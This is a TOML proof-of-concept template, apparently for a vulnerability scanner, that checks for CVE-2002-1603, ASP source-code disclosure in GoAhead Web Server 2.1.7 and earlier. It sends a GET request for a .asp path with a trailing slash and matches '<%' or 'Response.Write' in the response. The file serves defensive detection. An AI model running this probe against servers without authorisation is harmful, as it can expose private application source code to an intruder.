[info]
author = "ave"
description = "GoAhead Web Server 2.1.7 及更早版本存在 ASP 源代码信息泄露漏洞。通过在 ASP 文件 URL 末尾添加终止符（如 /），检测服务器是否返回未解析的原始 ASP 源代码，以确认漏洞是否存在。"
id = "POC-AVE-2002-0642"
name = "GoAhead Web Server ASP 源代码泄漏检测"
severity = "medium"
tags = ["ave-2002-0642"]
vuln_id = [
    "CVE-2002-1603",
    "AVE-2002-0642",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/test.asp/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "Response.Write",
]
